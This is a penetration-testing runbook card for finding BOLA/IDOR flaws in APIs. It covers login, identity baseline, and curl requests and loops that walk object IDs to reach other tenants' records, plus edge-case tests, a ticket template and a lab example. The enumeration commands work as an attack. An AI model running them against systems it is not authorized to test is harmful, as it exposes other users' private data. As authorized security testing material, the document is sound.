# Batch 01 — BOLA / IDOR (operator)

## FILL IN (any API)

```bash
BASE="https://api.example.com"
LOGIN_PATH="/api/v1/authentication/.../sign-in"   # from OAS
EMAIL="user-a@example.com"
PASS="..."
# Discover from OAS — any path with {id}, {ID}, {uuid}, {userId}
OBJECT_PATH="/api/v1/.../resource"                 # without id
OBJECT_BY_ID="$OBJECT_PATH/\$ID"                   # pattern
OWNER_FIELD="companyID"                            # or userId, accountId, customerID
MY_OWNER=""                                        # fill after baseline
```

## GOAL
As **authenticated user A**, access objects that belong to **user/tenant B** by changing an object identifier.

## TIME
45–90 min per API surface

## YOU NEED
- Two accounts same role (A, B) **or** A + leaked/guessable ids  
- OpenAPI/Swagger or traffic map  
- curl / gori / Burp  

---

## WHY (first principles)

```text
GET /resource/{id}  →  SELECT * WHERE id = {id}
```

Server checks “logged in?” but not “does this row belong to this principal?”

| Name | Same bug |
|------|----------|
| BOLA | OWASP API1:2023 |
| IDOR | classic web name |
| CWE-639 | Authorization Bypass Through User-Controlled Key |

**IDs:** integers (walk), UUIDs (leak from other endpoints), hashes, filenames.

Role may grant the **function** (`GetById`) while still missing **ownership**. That is BOLA, not BFLA.

Compare classes: [00-authz-authn-compare.md](./00-authz-authn-compare.md)

---

## DO THIS (generic operator path)

### 1) Inventory object endpoints

```bash
# From OAS
curl -sk -o openapi.json "$BASE/swagger/v1/swagger.json"   # or /openapi.json
grep -oE '"/[^"]*\{[^}]+\}[^"]*"' openapi.json | sort -u

# Or from gori/Burp history: paths containing /orders/ /users/ /reports/ etc.
```

**pinchtab:** open Swagger UI, screenshot, use Authorize if needed.

```bash
export PINCHTAB_SESSION=$(pinchtab session create --agent-id api-bola)
pinchtab nav "$BASE/swagger/index.html" --snap
pinchtab screenshot -o evidence/swagger-ui.png
```

### 2) Authenticate as user A

```bash
# Shape varies — JSON email/password is common
curl -sk -X POST "$BASE$LOGIN_PATH" \
  -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}"
# or Email/email, Password/password — match OAS

JWT=$( ... extract access_token / jwt from response ... )
```

### 3) Baseline: who am I / what do I own?

```bash
# Typical patterns — pick what exists in OAS
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../current-user"
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../roles/current-user"
```

Write:

```text
my_user_id=
my_owner_id=     # company/tenant
my_roles=
my_object_ids=   # create one object if needed
```

### 4) Access object by id (horizontal)

```bash
# Use B's id, sequential ints, or ids from list endpoints
ID=1
curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/.../resource/$ID"
```

**BOLA if:** response `OWNER_FIELD` ≠ `my_owner_id` (or data clearly B’s).

### 5) Mass walk (integers) / batch of UUIDs

```bash
for ((i=1; i<=50; i++)); do
  curl -s -w "\n" -H "Authorization: Bearer $JWT" \
    "$BASE/api/v1/.../resource/$i"
done
```

### 6) Second account proof (best evidence)

```text
1) As A create object → note id
2) As B GET/PUT/DELETE that id
3) Or as A GET B's id from B's session traffic
```

### 7) Operator log

```text
BOLA: yes/no
endpoint:
ids_proven:
impact:
```

---

## EDGE CASES (always run)

| # | Test |
|---|------|
| E1 | No auth on same URL → 401? |
| E2 | Bad token |
| E3 | id `0` `-1` huge / random UUID |
| E4 | Sequential range until empty |
| E5 | List collection 403 vs item 200 |
| E6 | PUT/PATCH/DELETE on object |
| E7 | All `{id}` params in OAS (not one path) |
| E8 | Create A → access B |
| E9 | HPP `id=1&id=2` |
| E10 | GraphQL `node(id:)` |
| E11 | Files: `/download?id=` PDF/photo |
| E12 | gori/Burp match-replace on id while using UI |

```bash
curl -sk -o /dev/null -w "noauth:%{http_code}\n" "$BASE/api/v1/.../resource/1"
curl -sk -o /dev/null -w "list:%{http_code}\n" -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../resource"
curl -sk -o /dev/null -w "item:%{http_code}\n" -H "Authorization: Bearer $JWT" "$BASE/api/v1/.../resource/1"
```

---

## Evidence comment (paste into ticket)

```text
Class: BOLA / IDOR (API1 / CWE-639).
Authenticated as owner X; GET {endpoint}/{id} returned owner Y ≠ X.
Not BFLA: function may be allowed; object ownership check failed.
Not BOPLA: issue is wrong object, not extra fields on our own object.
Evidence: baseline identity; sample response; id list / loop.
```

## Prevention

Compare resource owner to authenticated principal on **every** object access. Role alone is insufficient.

## IF / THEN

| See | Do |
|-----|-----|
| Other tenant data | Report BOLA + impact |
| Only own objects | Next `{id}` path / second account |
| 403 all ids | Need other role or BFLA/auth path first |

## NEXT
→ [02-broken-authentication.md](./02-broken-authentication.md)  
→ Re-run this card on **every** object id in OAS

---

## WORKED EXAMPLE (lab only — not the runbook)

Optional Inlanefreight academy shape. Full proof: `../notes/inlanefreight-bola/`.

| Item | Example value |
|------|----------------|
| Login | `POST /api/v1/authentication/suppliers/sign-in` |
| Object | `GET /api/v1/supplier-companies/yearly-reports/{ID}` |
| Baseline | `.../supplier-companies/current-user` |
| BOLA | id 1..18 → other `companyID` |
| Evidence | `notes/inlanefreight-bola/evidence/` |
